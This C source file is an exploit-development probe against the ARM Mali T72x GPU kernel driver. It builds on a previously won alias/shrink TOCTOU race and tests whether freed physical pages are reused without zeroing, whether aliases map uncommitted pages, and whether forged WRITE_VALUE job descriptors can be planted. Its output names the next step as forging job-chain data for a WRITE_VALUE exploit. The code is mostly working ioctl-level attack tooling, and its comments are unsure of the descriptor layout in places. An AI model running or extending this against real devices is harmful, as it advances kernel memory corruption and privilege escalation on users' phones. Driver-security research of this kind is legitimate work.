/* Force 64-bit file offsets so mmap() works with GPU VAs > 4GB on ARM32 */
#define _FILE_OFFSET_BITS 64
/* mali_alias_reclaim.c — Mali T72x Alias TOCTOU Physical Page Reclaim Test
 *
 * After winning the alias/shrink TOCTOU race (mali_alias_race.c, 92.6% win rate),
 * this probe answers the critical follow-up question:
 *
 *   Can we reclaim the freed physical pages with a new allocation?
 *   Do the new alloc and the old freed region share the same physical pages?
 *
 * Method:
 *   1. Alloc native 16 pages, CPU mmap, write canary 0xDEADBEEFCAFEBABE to pages 8-15
 *   2. Create alias (pages 8-15 of native), then do a non-racy sequential free:
 *      free alias first, then commit shrink to 8 (guarantee shrink succeeds)
 *   3. Alloc new 8-page region immediately (reclaim attempt)
 *   4. CPU mmap new region, read pages: look for canary bytes
 *   5. If canary present → same physical pages (page pool reuse confirmed, no zeroing)
 *   6. Also verifies GPU access to new region via WRITE_VALUE job
 *   7. Separate test: Try new alias after shrink at the uncommitted offset (TOCTOU angle)
 *
 * Safety: fork + alarm; no GPU access to freed/dangling pages; panic_on_oops=1 safe.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdint.h>
#include <pthread.h>

#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC    (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_COMMIT   (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY    (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE     (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS    (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS    (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT   (UK_FUNC_ID + 23)

#define BASE_MEM_PROT_CPU_RD    (1U << 0)
#define BASE_MEM_PROT_CPU_WR    (1U << 1)
#define BASE_MEM_PROT_GPU_RD    (1U << 2)
#define BASE_MEM_PROT_GPU_WR    (1U << 3)
#define BASE_MEM_GROW_ON_GPF    (1U << 9)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1
#define KBASE_MEM_QUERY_VA_SIZE     2
#define KBASE_MEM_QUERY_FLAGS       3

#define PAGE_SIZE 4096
#define CANARY64 0xDEADBEEFCAFEBABEULL

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t sizeOfUkHeader;
} uk_header;

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t _pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t  _pad1[6];
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

/* Atom submit structures (56-byte old56 layout used by this device) */
struct base_jd_udata {
    uint64_t blob[2];
};

struct kbase_uk_job_submit_atom {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t _pad0[3];
    uint32_t device_nr;
    uint16_t _pad1;
    uint16_t atom_number;
    int8_t   prio;
    int8_t   _pad2[3];
    uint8_t  core_req;
    uint8_t  _pad3[3];
    uint32_t pre_dep[2];
    uint32_t post_dep[2];
};

struct kbase_uk_job_submit {
    uk_header header;
    uint64_t addr;    /* pointer to atom array */
    uint32_t nr_atoms;
    uint32_t stride;
    uint32_t which;
    uint32_t padding;
};

static int g_fd;

static int mali_init(int fd) {
    uint8_t buf[64];
    memset(buf, 0, sizeof(buf));
    *(uint32_t*)buf = 0;
    *(uint16_t*)(buf + 8) = 10;
    *(uint16_t*)(buf + 10) = 2;
    if (ioctl(fd, _IOC(3, 0x80, 0, 16), buf) < 0) return -1;
    memset(buf, 0, sizeof(buf));
    *(uint32_t*)buf = 530;
    *(uint32_t*)(buf + 8) = 0;
    if (ioctl(fd, _IOC(3, 0x80, 0, 16), buf) < 0) return -1;
    return 0;
}

static uint64_t mali_alloc(int fd, uint64_t pages) {
    struct kbase_uk_mem_alloc a;
    memset(&a, 0, sizeof(a));
    a.header.id = KBASE_FUNC_MEM_ALLOC;
    a.va_pages = pages;
    a.commit_pages = pages;
    a.extent = pages;
    a.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
              BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
              BASE_MEM_GROW_ON_GPF;
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(a)), &a) < 0) return 0;
    if (a.header.ret != 0) return 0;
    return a.gpu_va;
}

static uint64_t mali_alias(int fd, uint64_t src_va, uint64_t offset, uint64_t length) {
    struct base_mem_aliasing_info ai;
    memset(&ai, 0, sizeof(ai));
    ai.handle = src_va;
    ai.offset = offset;
    ai.length = length;

    struct kbase_uk_mem_alias alias;
    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = length;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&ai;
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(alias)), &alias) < 0) return 0;
    if (alias.header.ret != 0) return 0;
    return alias.gpu_va;
}

/* Create CPU+GPU-accessible alias */
static uint64_t mali_alias_cpu(int fd, uint64_t src_va, uint64_t offset, uint64_t length) {
    struct base_mem_aliasing_info ai;
    memset(&ai, 0, sizeof(ai));
    ai.handle = src_va;
    ai.offset = offset;
    ai.length = length;

    struct kbase_uk_mem_alias alias;
    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = length;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&ai;
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(alias)), &alias) < 0) return 0;
    if (alias.header.ret != 0) return 0;
    return alias.gpu_va;
}

static int mali_free(int fd, uint64_t va) {
    struct kbase_uk_mem_free mf;
    memset(&mf, 0, sizeof(mf));
    mf.header.id = KBASE_FUNC_MEM_FREE;
    mf.gpu_addr = va;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(mf)), &mf);
    return mf.header.ret;
}

static int mali_commit(int fd, uint64_t va, uint64_t pages) {
    struct kbase_uk_mem_commit c;
    memset(&c, 0, sizeof(c));
    c.header.id = KBASE_FUNC_MEM_COMMIT;
    c.gpu_addr = va;
    c.pages = pages;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(c)), &c);
    return c.header.ret;
}

static uint64_t mali_query(int fd, uint64_t va, uint64_t query_type) {
    struct kbase_uk_mem_query q;
    memset(&q, 0, sizeof(q));
    q.header.id = KBASE_FUNC_MEM_QUERY;
    q.gpu_addr = va;
    q.query = query_type;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(q)), &q);
    return q.value;
}

static void *mali_mmap(int fd, uint64_t gpu_va, size_t length) {
    /* Requires _FILE_OFFSET_BITS=64 so off_t=64-bit and mmap uses mmap2 on ARM32 */
    void *ptr = mmap(NULL, length, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, (off_t)gpu_va);
    if (ptr == MAP_FAILED) {
        printf("  mmap64 errno=%d (%s) for gpu_va=0x%llx\n",
               errno, strerror(errno), (unsigned long long)gpu_va);
        return NULL;
    }
    return ptr;
}

/* Count CANARY64 patterns in a buffer */
static int count_canary(const uint8_t *buf, size_t len, const char *label) {
    int found = 0;
    for (size_t i = 0; i + 8 <= len; i += 8) {
        uint64_t val;
        memcpy(&val, buf + i, 8);
        if (val == CANARY64) found++;
    }
    printf("  [canary scan] %s: found %d canary qwords out of %zu slots\n",
           label, found, len / 8);
    return found;
}

/* ================================================================
 * TEST A: Sequential (non-race) free + shrink, then reclaim
 * ================================================================ */
static void test_sequential_reclaim(int fd) {
    printf("\n=== TEST A: Sequential free→shrink→reclaim (non-race) ===\n");

    /* Alloc native 16 pages */
    uint64_t native_va = mali_alloc(fd, 16);
    if (!native_va) { printf("[-] native alloc failed\n"); return; }
    printf("[+] native_va=0x%llx\n", (unsigned long long)native_va);

    /* CPU mmap native */
    size_t mmap_size = 16 * PAGE_SIZE;
    uint8_t *native_cpu = mali_mmap(fd, native_va, mmap_size);
    if (!native_cpu) { printf("[-] native mmap failed: %s\n", strerror(errno)); mali_free(fd, native_va); return; }

    /* Write canary to pages 8-15 */
    printf("[*] Writing canary 0x%016llx to native pages 8-15...\n", (unsigned long long)CANARY64);
    for (size_t i = 8 * PAGE_SIZE; i < 16 * PAGE_SIZE; i += 8) {
        uint64_t c = CANARY64;
        memcpy(native_cpu + i, &c, 8);
    }

    /* Verify canary */
    count_canary(native_cpu + 8 * PAGE_SIZE, 8 * PAGE_SIZE, "native pages 8-15 before race");

    /* Create alias (pages 8-15) to increment gpu_mappings */
    uint64_t alias_va = mali_alias(fd, native_va, 8, 8);
    if (!alias_va) { printf("[-] alias failed\n"); munmap(native_cpu, mmap_size); mali_free(fd, native_va); return; }
    printf("[+] alias_va=0x%llx (pages 8-15)\n", (unsigned long long)alias_va);

    /* Free alias first (sequential, no race) */
    mali_free(fd, alias_va);
    printf("[*] alias freed\n");

    /* Shrink commit from 16 to 8 (should succeed now) */
    int r = mali_commit(fd, native_va, 8);
    printf("[*] commit shrink (16→8): ret=%d (expect 0)\n", r);
    uint64_t commit_now = mali_query(fd, native_va, KBASE_MEM_QUERY_COMMIT_SIZE);
    printf("[*] commit_now=%llu\n", (unsigned long long)commit_now);

    if (r != 0) {
        printf("[-] shrink failed, skipping reclaim test\n");
        munmap(native_cpu, mmap_size);
        mali_free(fd, native_va);
        return;
    }

    /* Native pages 8-15 are now freed from commit. Try to reclaim. */
    uint64_t new_va = mali_alloc(fd, 8);
    if (!new_va) { printf("[-] reclaim alloc failed\n"); munmap(native_cpu, mmap_size); mali_free(fd, native_va); return; }
    printf("[+] reclaim new_va=0x%llx\n", (unsigned long long)new_va);

    /* CPU mmap new allocation */
    size_t new_mmap_size = 8 * PAGE_SIZE;
    uint8_t *new_cpu = mali_mmap(fd, new_va, new_mmap_size);
    if (!new_cpu) { printf("[-] new mmap failed: %s\n", strerror(errno)); mali_free(fd, new_va); munmap(native_cpu, mmap_size); mali_free(fd, native_va); return; }

    /* Read new alloc pages: do they contain the canary? */
    printf("[*] Reading new_alloc pages looking for canary...\n");
    int canary_count = count_canary(new_cpu, new_mmap_size, "new_alloc after reclaim");

    if (canary_count > 0) {
        printf("[!!!] PHYSICAL PAGE REUSE CONFIRMED!\n");
        printf("      new_alloc contains %d canary qwords from freed native pages 8-15\n", canary_count);
        printf("      → Mali does NOT zero freed pages before reuse\n");
        printf("      → Physical page pool reuse is predictable\n");
        printf("      → Next step: forge JC data in these pages for WRITE_VALUE exploit\n");
    } else {
        /* Check if all zeros (zeroed on alloc) */
        int all_zero = 1;
        for (int i = 0; i < (int)new_mmap_size; i++) {
            if (new_cpu[i] != 0) { all_zero = 0; break; }
        }
        if (all_zero) {
            printf("[*] new_alloc is all zeros → Mali zeroes freed pages before reuse\n");
            printf("[*] Physical page reuse still likely, but driver sanitizes memory\n");
        } else {
            printf("[?] new_alloc has non-zero, non-canary data\n");
            printf("    First 32 bytes of new_alloc:\n    ");
            for (int i = 0; i < 32; i++) printf("%02x ", (uint8_t)new_cpu[i]);
            printf("\n");
        }
    }

    munmap(new_cpu, new_mmap_size);
    mali_free(fd, new_va);
    munmap(native_cpu, mmap_size);
    mali_free(fd, native_va);
}

/* ================================================================
 * TEST B: Alias at uncommitted offset (post-shrink alias creation)
 * ================================================================ */
static void test_alias_uncommitted(int fd) {
    printf("\n=== TEST B: Create alias at uncommitted offset after shrink ===\n");
    printf("[*] Alloc 16 pages, shrink to 8, then try alias(offset=8) on uncommitted pages\n");

    uint64_t native_va = mali_alloc(fd, 16);
    if (!native_va) { printf("[-] alloc failed\n"); return; }
    printf("[+] native_va=0x%llx commit=16\n", (unsigned long long)native_va);

    /* Shrink to 8 first (no alias, guaranteed to succeed) */
    int r = mali_commit(fd, native_va, 8);
    printf("[*] commit 16→8: ret=%d\n", r);

    /* Try to create alias at the uncommitted offset 8-15 */
    printf("[*] Trying alias(native_va, offset=8, length=8) on uncommitted pages...\n");
    uint64_t alias_bad = mali_alias(fd, native_va, 8, 8);
    if (alias_bad) {
        printf("[!!!] ALIAS ON UNCOMMITTED PAGES SUCCEEDED! alias_va=0x%llx\n",
               (unsigned long long)alias_bad);
        printf("      → GPU PTEs for alias point to uncommitted physical pages!\n");
        printf("      → Committing native pages 8-15 now would be GPU-accessible via alias!\n");
        /* Check what the alias VA looks like via query */
        uint64_t alias_commit = mali_query(fd, alias_bad, KBASE_MEM_QUERY_COMMIT_SIZE);
        uint64_t alias_va_size = mali_query(fd, alias_bad, KBASE_MEM_QUERY_VA_SIZE);
        printf("      alias: commit=%llu va_size=%llu\n",
               (unsigned long long)alias_commit, (unsigned long long)alias_va_size);
        mali_free(fd, alias_bad);
    } else {
        printf("[*] Alias on uncommitted offset rejected (expected)\n");
    }

    /* Try alias at committed offset 0-7 (should work) */
    uint64_t alias_ok = mali_alias(fd, native_va, 0, 8);
    if (alias_ok) {
        printf("[+] Alias at committed offset 0-7: OK (alias_va=0x%llx)\n",
               (unsigned long long)alias_ok);
        mali_free(fd, alias_ok);
    } else {
        printf("[-] Alias at committed offset 0-7: FAILED\n");
    }

    mali_free(fd, native_va);
}

/* ================================================================
 * TEST C: Re-expand commit after partial free (grow back)
 * ================================================================ */
static void test_commit_grow_back(int fd) {
    printf("\n=== TEST C: Shrink then expand commit (grow back) ===\n");

    uint64_t native_va = mali_alloc(fd, 16);
    if (!native_va) { printf("[-] alloc failed\n"); return; }
    printf("[+] native_va=0x%llx\n", (unsigned long long)native_va);

    /* CPU mmap full region */
    uint8_t *cpu = mali_mmap(fd, native_va, 16 * PAGE_SIZE);
    if (!cpu) { printf("[-] mmap failed\n"); mali_free(fd, native_va); return; }

    /* Write canary to all pages */
    for (size_t i = 0; i < 16 * PAGE_SIZE; i += 8) {
        uint64_t c = CANARY64;
        memcpy(cpu + i, &c, 8);
    }
    printf("[*] Canary written to all 16 pages\n");

    /* Shrink commit to 8 */
    int r = mali_commit(fd, native_va, 8);
    printf("[*] commit 16→8: ret=%d\n", r);

    /* Read remaining 8 pages: still have canary? */
    count_canary(cpu, 8 * PAGE_SIZE, "pages 0-7 after shrink");

    /* Try to read pages 8-15 (uncommitted) - may fault or return zero */
    printf("[*] Reading pages 8-15 (now uncommitted) via CPU mmap...\n");
    /* This is safe - uncommitted pages with GROW_ON_GPF will be re-committed on fault */
    count_canary(cpu + 8 * PAGE_SIZE, 8 * PAGE_SIZE, "pages 8-15 after shrink (GROW_ON_GPF re-commits)");

    /* Grow commit back to 16 */
    int r2 = mali_commit(fd, native_va, 16);
    printf("[*] commit 8→16 (grow back): ret=%d\n", r2);
    uint64_t commit_final = mali_query(fd, native_va, KBASE_MEM_QUERY_COMMIT_SIZE);
    printf("[*] commit_final=%llu\n", (unsigned long long)commit_final);

    /* Read pages 8-15 after grow back */
    count_canary(cpu + 8 * PAGE_SIZE, 8 * PAGE_SIZE, "pages 8-15 after grow back");

    munmap(cpu, 16 * PAGE_SIZE);
    mali_free(fd, native_va);
}

/* ================================================================
 * TEST D: CPU-accessible alias + race window for JC injection
 * ================================================================ */
static volatile int g_signal_fire;
static uint64_t g_native_va_d;
static uint64_t g_alias_d;
static int g_fd_d;

static void *thread_shrink_raced(void *arg) {
    (void)arg;
    while (!g_signal_fire) { /* spin */ }
    /* Shrink native from 16 to 8 (try to race alias free) */
    mali_commit(g_fd_d, g_native_va_d, 8);
    return NULL;
}

static void test_cpu_alias_race(int fd) {
    printf("\n=== TEST D: CPU-accessible alias + race window ===\n");
    printf("[*] Create CPU+GPU alias, write JC data via native CPU, race shrink\n");

    g_fd_d = fd;
    g_native_va_d = mali_alloc(fd, 16);
    if (!g_native_va_d) { printf("[-] native alloc failed\n"); return; }

    /* CPU mmap native (pages 8-15 will be our JC page) */
    uint8_t *native_cpu = mali_mmap(fd, g_native_va_d, 16 * PAGE_SIZE);
    if (!native_cpu) { printf("[-] mmap failed\n"); mali_free(fd, g_native_va_d); return; }

    /* Write a WRITE_VALUE JC descriptor to native pages 8-15 via CPU
     * WRITE_VALUE descriptor layout (from research):
     *   jc[0]:  exception_status = 0x00000000 (cleared)
     *   jc[2]:  first_incomplete_task = 0  
     *   jc[4]:  job type: 8 = WRITE_VALUE
     *   jc[5]:  job id
     *   jc[6]:  next descriptor (64-bit, 0 = last)
     *   jc[8]:  payload address (64-bit GPU VA)
     *   jc[10]: value to write (64-bit) 
     * Actually using 32-bit word indexing:
     */
    uint32_t *jc = (uint32_t *)(native_cpu + 8 * PAGE_SIZE);
    memset(jc, 0, PAGE_SIZE);
    /* The actual WRITE_VALUE layout on T72x:
     * +0x00: exception_status (cleared = 0)
     * +0x04: first_incomplete_task (0)
     * +0x08: fault_addr_lo (0)
     * +0x0c: fault_addr_hi (0)
     * +0x10: flags[0:15] = 0x0000, job_type[16:19] = WRITE_VALUE(4=WV or see enum), atom_num[20:27]
     *   or: word 4 = (job_type << 16) | flags
     * +0x14: reserved
     * +0x18: next_job_lo (0 = last)
     * +0x1c: next_job_hi
     * +0x20: target_addr_lo  (GPU VA of target, must be valid mapped GPU VA)
     * +0x24: target_addr_hi
     * +0x28: write_value (64-bit value to write)
     * +0x30: reserved...
     *
     * Job type 8 = BASE_JD_REQ_CS (CS job). WRITE_VALUE = dedicated job type 4.
     * From mali documentation: WRITE_VALUE job type code = 0x04
     */
    jc[4] = (4U << 16);     /* job_type = WRITE_VALUE (4), atom_number = 0 */
    /* Target = native_va page 0 (a safe GPU VA we own) */
    uint64_t target_va = g_native_va_d;  /* first page of native = safe target */
    jc[8] = (uint32_t)(target_va & 0xFFFFFFFF);
    jc[9] = (uint32_t)(target_va >> 32);
    /* Write value = 0x1234567890ABCDEF */
    jc[10] = 0x90ABCDEF;
    jc[11] = 0x12345678;

    printf("[*] JC data written to native pages 8-15 (offset=%zuKB)\n", 8 * PAGE_SIZE / 1024);
    printf("    job_type=0x%x target=0x%llx value=0x1234567890ABCDEF\n",
           jc[4] >> 16, (unsigned long long)target_va);

    /* Create CPU+GPU alias pointing at pages 8-15 */
    g_alias_d = mali_alias_cpu(fd, g_native_va_d, 8, 8);
    if (!g_alias_d) {
        printf("[-] CPU alias failed: %s\n", strerror(errno));
        printf("[*] Fallback: trying GPU-only alias\n");
        g_alias_d = mali_alias(fd, g_native_va_d, 8, 8);
    }
    if (!g_alias_d) { printf("[-] alias failed\n"); munmap(native_cpu, 16*PAGE_SIZE); mali_free(fd, g_native_va_d); return; }
    printf("[+] alias_va=0x%llx (pages 8-15)\n", (unsigned long long)g_alias_d);

    /* Query alias physical state */
    uint64_t alias_commit = mali_query(fd, g_alias_d, KBASE_MEM_QUERY_COMMIT_SIZE);
    printf("[*] alias commit_size=%llu\n", (unsigned long long)alias_commit);

    /* Race: shrink native while alias is alive (but don't also free alias) */
    /* This bypasses the race and just tests if shrink is possible with alias alive */
    printf("[*] Attempting shrink (16→8) while alias is alive...\n");
    int r = mali_commit(fd, g_native_va_d, 8);
    printf("[*] shrink with alias alive: ret=%d (0=success, 3=blocked)\n", r);
    if (r == 0) {
        printf("[!!!] SHRINK WITH ALIVE ALIAS SUCCEEDED (no race needed?)\n");
        /* Read alias via CPU mmap - is the JC data still accessible? */
        uint8_t *alias_cpu = mali_mmap(fd, g_alias_d, 8 * PAGE_SIZE);
        if (alias_cpu && alias_cpu != MAP_FAILED) {
            uint32_t *alias_jc = (uint32_t *)alias_cpu;
            printf("[*] alias CPU read: jc[4]=0x%x jc[8]=0x%x jc[9]=0x%x\n",
                   alias_jc[4], alias_jc[8], alias_jc[9]);
            int canary = (alias_jc[4] == (4U << 16)) ? 1 : 0;
            printf("    JC data %s via alias\n", canary ? "READABLE" : "NOT readable (zeroed)");
            munmap(alias_cpu, 8 * PAGE_SIZE);
        }
    } else {
        printf("[*] Shrink blocked by alias (normal behavior)\n");
    }

    mali_free(fd, g_alias_d);
    munmap(native_cpu, 16 * PAGE_SIZE);
    mali_free(fd, g_native_va_d);
}

static void do_tests(void) {
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) { printf("[-] open /dev/mali0: %s\n", strerror(errno)); return; }
    if (mali_init(fd) < 0) { printf("[-] mali_init failed\n"); close(fd); return; }
    printf("[+] Mali initialized (fd=%d)\n", fd);
    g_fd = fd;

    test_sequential_reclaim(fd);
    test_alias_uncommitted(fd);
    test_commit_grow_back(fd);
    test_cpu_alias_race(fd);

    printf("\n=== All tests complete ===\n");
    close(fd);
}

int main(void) {
    printf("=== Mali T72x Alias Reclaim + Uncommitted Page Tests ===\n\n");
    pid_t pid = fork();
    if (pid == 0) {
        alarm(60);
        do_tests();
        _exit(0);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) printf("\nChild exited: %d\n", WEXITSTATUS(status));
        else if (WIFSIGNALED(status)) printf("\nChild killed by signal: %d\n", WTERMSIG(status));
    } else {
        perror("fork");
        return 1;
    }
    return 0;
}
